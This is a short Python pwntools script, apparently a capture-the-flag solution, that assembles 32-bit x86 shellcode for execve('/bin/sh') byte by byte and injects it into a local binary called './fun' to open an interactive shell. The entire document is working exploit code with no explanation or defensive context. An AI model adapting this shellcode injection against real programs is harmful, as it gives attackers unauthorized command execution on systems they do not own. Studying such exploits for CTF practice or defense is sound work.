#!/usr/bin/python3
from pwn import process, asm

shell = process("./fun")

shellcode  = b""
shellcode += asm("xor eax, eax") # $eax = 0x0
shellcode += asm("mov al, 0xb")  # $eax = execve()
shellcode += asm("xor ebx, ebx") # $ebx = 0x0
shellcode += asm("mov bl, 0x68") # $ebx = 0x68
shellcode += asm("shl ebx") * 16 # $ebx = 0x00680000
shellcode += asm("mov bh, 0x73") # $ebx = 0x00687300
shellcode += asm("mov bl, 0x2f") # $ebx = 0x0068732f
shellcode += asm("push ebx")     # $esp = &"/sh\x00"
shellcode += asm("nop")          # padding with nop
shellcode += asm("mov bh, 0x6e") # $ebx = 0x00006e00
shellcode += asm("mov bl, 0x69") # $ebx = 0x00006e69
shellcode += asm("shl ebx") * 16 # $ebx = 0x6e690000
shellcode += asm("mov bh, 0x62") # $ebx = 0x6e696200
shellcode += asm("mov bl, 0x2f") # $ebx = 0x6e69622f
shellcode += asm("push ebx")     # $esp = &"/bin/sh"
shellcode += asm("nop")          # padding with nop
shellcode += asm("mov ebx, esp") # $ebx = &"/bin/sh"
shellcode += asm("xor ecx, ecx") # $ecx = NULL
shellcode += asm("xor edx, edx") # $edx = NULL
shellcode += asm("int 0x80")     # syscall

shell.sendlineafter(b":\n", shellcode)
shell.interactive()
